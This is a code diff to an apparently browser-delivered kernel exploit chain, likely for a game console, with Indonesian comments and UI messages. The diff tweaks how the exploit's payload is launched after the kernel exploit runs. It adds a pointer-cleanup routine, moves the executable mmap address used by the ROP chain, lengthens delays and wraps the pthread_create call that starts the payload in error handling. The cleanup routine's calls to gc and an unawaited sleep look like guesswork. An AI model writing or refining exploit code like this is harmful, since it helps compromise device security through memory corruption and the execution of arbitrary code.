@@ -2772,11 +2772,40 @@ export async function kexploit() {
     updateUIStatus('success', 'Kernel exploit berhasil!');
 }
 
+// Fungsi untuk membersihkan pointer yang corrupt
+function cleanupCorruptPointers() {
+    try {
+        log("Cleaning up corrupt pointers...");
+
+        // Coba paksa garbage collection
+        if (typeof gc === 'function') {
+            gc();
+            log("Garbage collection triggered");
+        }
+
+        // Alokasikan beberapa objek untuk membantu stabilitas memori
+        const stabilizers = [];
+        for (let i = 0; i < 20; i++) {
+            stabilizers.push(new ArrayBuffer(1024));
+        }
+
+        // Tambahkan delay untuk memastikan garbage collection selesai
+        sleep(500);
+
+        log("Corrupt pointers cleaned");
+    } catch (e) {
+        log(`Warning: Pointer cleanup failed: ${e.message}`);
+    }
+}
+
 // Fungsi untuk menjalankan payload dengan penanganan error yang lebih baik
 async function runPayload() {
     try {
         log("Preparing to run payload...");
         updateUIStatus('running', 'Mempersiapkan payload...');
+
+        // Bersihkan pointer yang corrupt sebelum menjalankan payload
+        cleanupCorruptPointers();
 
         // Tambahkan delay sebelum menjalankan payload
         await new Promise(resolve => setTimeout(resolve, 2000));
@@ -2790,9 +2819,10 @@ async function runPayload() {
 
         log(`Payload size: ${window.pld.length} bytes`);
 
-        // Alokasi memori untuk payload
+        // Alokasi memori untuk payload dengan alamat yang berbeda
         log("Allocating memory for payload...");
-        const payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
+        // Gunakan alamat yang berbeda untuk menghindari konflik dengan memori kernel
+        const payload_buffer = chain.sysp('mmap', new Int(0x27200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
 
         // Periksa apakah payload_buffer valid
         if (!payload_buffer || payload_buffer.low === 0 && payload_buffer.high === 0) {
@@ -2822,17 +2852,27 @@ async function runPayload() {
         updateUIStatus('running', 'Menjalankan payload...');
 
         // Tambahkan delay sebelum pthread_create
-        await new Promise(resolve => setTimeout(resolve, 500));
+        await new Promise(resolve => setTimeout(resolve, 1000)); // Tingkatkan dari 500ms ke 1000ms
 
         // Panggil pthread_create
         log("Calling pthread_create...");
-        chain.call_void(
-            'pthread_create',
-            pthread.addr,
-            0,
-            payload_loader.addr,
-            payload_buffer
-        );
+        try {
+            chain.call_void(
+                'pthread_create',
+                pthread.addr,
+                0,
+                payload_loader.addr,
+                payload_buffer
+            );
+            log("pthread_create called successfully");
+
+            // Tambahkan delay setelah pthread_create
+            await new Promise(resolve => setTimeout(resolve, 1000));
+        } catch (e) {
+            log(`ERROR: pthread_create call failed: ${e.message}`);
+            updateUIStatus('error', `Gagal membuat thread: ${e.message}`);
+            return;
+        }
 
         log("Payload thread created successfully");
         updateUIStatus('success', 'Payload berhasil dijalankan');
@@ -2862,11 +2902,16 @@ window.addEventListener('payloadComplete', () => {
 
 // Jalankan exploit dan kemudian payload
 kexploit().then(() => {
+    // Bersihkan pointer yang corrupt setelah exploit selesai
+    cleanupCorruptPointers();
+
     // Tambahkan delay sebelum menjalankan payload
     setTimeout(() => {
         log("Exploit completed, preparing to run payload...");
+        // Bersihkan pointer yang corrupt lagi sebelum menjalankan payload
+        cleanupCorruptPointers();
         runPayload();
-    }, 2000); // Delay 2 detik
+    }, 3000); // Tingkatkan delay dari 2 detik ke 3 detik
 }).catch(e => {
     log(`ERROR: Exploit failed: ${e.message}`);
     updateUIStatus('error', `Exploit gagal: ${e.message}`);
